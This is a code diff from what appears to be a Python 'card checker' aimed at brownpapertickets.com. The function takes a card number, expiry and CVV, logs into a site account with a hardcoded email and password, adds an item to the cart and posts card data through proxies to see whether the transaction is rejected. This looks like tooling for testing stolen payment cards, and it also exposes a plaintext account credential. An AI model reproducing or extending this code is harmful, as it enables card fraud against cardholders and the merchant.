@@ -126,9 +126,7 @@ def checker(card, month, year, cvv):
             email_id = pegarItem(response.text, '<INPUT TYPE="email" NAME="','" VALUE="Email or login"')
             password = pegarItem(response.text, '<INPUT TYPE="password" NAME="','"')
             bpt = response.cookies.get('bpt')
-            print(response.headers)
-            print(response.cookies)
-            
+           
 
             url = "https://www.brownpapertickets.com/login.html"
             payload = f'{email_id}=suor_jose2daislv%40gmail.com&not_a_valid_field=Password&{password}=radask10'
@@ -156,7 +154,7 @@ def checker(card, month, year, cvv):
             client_secure = response.headers.get('client_secure')
             
       
-      
+            time.sleep(3)
 
 
             url = "https://www.brownpapertickets.com/addtocart/6286439"
@@ -208,17 +206,16 @@ def checker(card, month, year, cvv):
                 'Content-Type': 'application/x-www-form-urlencoded'
                 }
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
-            
-            
-            
-            
-
-
-
-
-            
             if "Redirection" in response.text:
                 raise RequisicaoException()
+            
+            
+            
+        
+
+
+
+
                 
                     
             if 'Invalid transaction' in response.text:
